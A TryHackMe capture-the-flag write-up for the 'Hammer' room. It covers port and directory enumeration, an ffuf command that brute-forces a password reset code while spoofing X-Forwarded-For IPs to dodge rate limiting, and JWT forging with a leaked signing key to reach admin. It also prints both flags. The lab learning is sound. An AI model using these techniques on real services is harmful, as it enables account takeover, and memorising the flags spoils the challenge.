
# 🔨 TryHackMe: Hammer

> A vulnerable web app focused on login bypass, rate limit abuse, and JWT token manipulation.  
> 💡 Skills practiced: Port scanning, directory brute-force, request fuzzing, session manipulation, and JWT tampering.

---

## 🎯 Objectives

- Enumerate services and directories
- Bypass rate-limited password reset mechanism
- Manipulate JWT token to gain admin access
- Capture both user and root flags

---

## 🔧 Tools Used

- `nmap` – Full port scan  
- `ffuf` – Directory and code brute-forcing  
- `Burp Suite` – For intercepting and analyzing requests  
- `printf`, `head` – Wordlist generation for brute-force  
- `jwt.io` – For decoding and re-signing JWTs  
- Firefox Dev Tools – Cookie inspection

---

## 🔍 Enumeration

Initial full-port scan using:

```bash
nmap -p- -sV 10.10.63.242
```

Result:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
1337/tcp open  http    Apache 2.4.41
```

Visited `http://10.10.63.242:1337` — login page detected.

---

## 💡 Web Discovery & Directory Brute-Forcing

Inspected source code and found a hint:
```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

Ran ffuf to discover hidden directories:

```bash
ffuf -u http://10.10.63.242:1337/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Found:
- `/hmr_logs/error.logs` — contained:
  - User: `tester`
  - Directory: `/restricted-area`

Tried password reset on tester@hammer.thm → asked for a 4-digit code

---

## 🔐 Bypassing Password Reset Rate-Limit

The form was IP rate-limited. I generated:

```bash
# Generate all 4-digit codes
printf "%04d\n" {0..9999} > count-9999.txt

# Create 1000 fake IPs
for X in {0..255}; do for Y in {0..255}; do echo "192.168.$X.$Y"; done; done > fake_ip.txt
head -n 1000 fake_ip.txt > fake_ip_cut.txt
```

Brute-forced the reset code with `ffuf`:

```bash
ffuf -w count-9999.txt:W1 -w fake_ip_cut.txt:W2 \
-u "http://10.10.63.242:1337/reset_password.php" \
-X POST -d "recovery_code=W1&s=80" \
-b "PHPSESSID=YOUR_SESSION_HERE" \
-H "X-Forwarded-For: W2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fr "Invalid" -mode pitchfork -fw 1 -rate 100 -o output.txt
```

Got the code ✅ → reset password → logged in as `tester`.

---

## 🚩 User Flag

After login:
```txt
THM{AuthBypass3D}
```

---

## 🔍 JWT Manipulation for Admin Access

Source code revealed JWT in JS:

```js
var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1Ni...';
```

Decoded at `jwt.io`, changed role to `"admin"`.

Re-signed using `.key` found in `/188ade1.key`.

Replaced the `Authorization` header:

```http
Authorization: Bearer MODIFIED.JWT.HERE
```

Gained admin access ✅

---

## 🏁 Root Flag

Accessed `/home/ubuntu/flag.txt`:
```bash
cat /home/ubuntu/flag.txt
```

Flag:
```txt
THM{RUNANYCOMMAND1337}
```

---

## 📚 What I Learned

- Enumerating hidden directories using `ffuf`  
- Bypassing IP-based rate limits with fake headers  
- Brute-forcing numeric codes using wordlists  
- Analyzing and forging JWT tokens using leaked key  
- Login logic & privilege escalation through web abuse

---

✅ End of walkthrough.
